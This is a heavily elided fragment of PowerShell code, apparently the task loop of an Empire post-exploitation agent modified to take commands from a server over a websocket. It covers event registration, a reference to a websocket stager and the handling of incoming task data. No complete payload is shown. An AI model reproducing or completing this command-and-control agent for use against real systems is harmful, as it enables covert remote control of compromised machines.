...
function Invoke-Empire {
    <#
        ...
        .PARAMETER client
        websocket client object to pass to the agent
    ...
    $OnDataReceived = {New-Event -SourceIdentifier "ServerEventReceive" -MessageData $($event.SourceEventArgs.Data)}
    $null = Register-ObjectEvent -InputObject $script:client -EventName DataReceived -Action $OnDataReceived
    ...
    # all of the headers have been added to the websocket client from websocketstager.ps1
    <#
    ...
    while ($script:client.State -ne "closed") {
        ...
        #Working Hours aren't necessary either. We're either connected to the server or we're not
        ...
        if ($TaskData) {
            ...
            if ($TaskData -ne 0x02 -or $TaskData -ne 0x01) {
